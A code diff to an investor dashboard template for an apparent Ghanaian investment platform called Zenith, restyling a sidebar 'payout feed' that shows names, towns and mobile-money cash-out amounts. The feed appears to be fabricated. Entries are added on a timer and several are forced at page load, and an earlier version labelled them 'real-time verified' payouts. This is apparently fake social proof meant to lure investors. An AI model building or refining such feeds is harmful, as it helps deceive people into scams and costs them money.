@@ -510,23 +510,23 @@ INVESTOR_DASHBOARD_TEMPLATE = """
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         
-        /* SIDE-BY-SIDE EXPANDED LAYOUT */
-        .main-layout { max-width: 1300px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }
-        .dashboard-container { flex: 2.2; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        /* WIDE SIDE-BY-SIDE LAYOUT */
+        .main-layout { max-width: 1150px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }
+        .dashboard-container { flex: 2.3; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         
-        /* EXPANDED PROFESSIONAL SIDEBAR TICKER */
+        /* WIDER SIDEBAR TICKER CARD LAYOUT MATCHING REFERENCE */
         .sidebar-ticker { 
-            flex: 1.2; 
-            background: linear-gradient(135deg, #090d09, #112211); 
-            color: #00ff66; 
-            padding: 22px; 
+            flex: 1; 
+            background: #111827; 
+            color: #ffffff; 
+            padding: 16px; 
             border-radius: 8px; 
             position: sticky; 
             top: 20px; 
             max-height: 88vh; 
             overflow-y: auto;
-            border: 1px solid #00ff6633;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            border: 1px solid #1f2937;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.25);
         }
         
         h2 { color: #028a0f; margin-top: 0; }
@@ -553,18 +553,31 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         .countdown-live-box { background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }
         .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
         
-        /* CLEAR & PROFESSIONAL SIDEBAR FEED STYLING */
+        /* CLEAN CARD ITEM STYLING FOR SIDEBAR FEED (MATCHING REFERENCE IMAGE) */
         .side-ticker-item { 
-            background: #111e11; 
-            border: 1px solid #1e3a1e;
-            border-left: 4px solid #00ff66; 
-            padding: 12px; 
+            background: #1e293b; 
+            border: 1px solid #334155;
+            border-left: 4px solid #22c55e; 
+            padding: 12px 14px; 
             margin-bottom: 12px; 
             border-radius: 6px; 
             font-size: 13px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.15);
+            line-height: 1.4;
         }
-        .side-ticker-item b { color: #facc15; }
+        .side-ticker-item .name-town { 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: #facc15; 
+            margin-bottom: 4px; 
+        }
+        .side-ticker-item .payout-text { 
+            font-size: 13px; 
+            color: #cbd5e1; 
+        }
+        .side-ticker-item .payout-text b { 
+            color: #4ade80; 
+        }
         .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }
     </style>
 </head>
@@ -662,11 +675,10 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             {% endif %}
         </div>
 
-        <!-- SIDEBAR TICKER MOVED SIDE-BY-SIDE AND EXPANDED -->
+        <!-- WIDER SIDEBAR TICKER CARD LAYOUT (MATCHING REFERENCE) -->
         <div class="sidebar-ticker">
-            <h3 style="color: #00ff66; font-size: 16px; margin-top: 0; border-bottom: 1px solid #1e3a1e; padding-bottom: 10px; text-align: center; text-transform: uppercase; letter-spacing: 0.5px;">🟢 Live Zenith Payout Feed</h3>
-            <p style="font-size: 11px; color: #94a3b8; text-align: center; margin-top: 4px; margin-bottom: 15px;">Real-time verified MoMo payouts across Ghana</p>
-            <div id="sideTickerList"></div>
+            <h3 style="color: #4ade80; font-size: 15px; margin-top: 0; border-bottom: 1px solid #334155; padding-bottom: 10px; text-align: center; text-transform: uppercase; letter-spacing: 0.5px;">Zenith Withdrawals</h3>
+            <div id="sideTickerList" style="margin-top: 12px;"></div>
         </div>
     </div>
 
@@ -736,11 +748,16 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             
             const item = document.createElement('div');
             item.className = 'side-ticker-item';
-            item.innerHTML = `<b>${name}</b> (${town})<br>Cashed out <b>GHs ${amt.toLocaleString()}</b> via MoMo`;
+            item.innerHTML = `
+                <div class="name-town">${name}</div>
+                <div style="font-size:12px; color:#94a3b8; margin-bottom:4px;">(${town})</div>
+                <div class="payout-text">Cashed out <b>GHs ${amt.toLocaleString()}</b> via MoMo</div>
+            `;
             list.prepend(item);
-            if (list.children.length > 6) list.lastChild.remove();
+            if (list.children.length > 5) list.lastChild.remove();
         }
         setInterval(addSideTickerItem, 4500);
+        addSideTickerItem();
         addSideTickerItem();
         addSideTickerItem();
         addSideTickerItem();
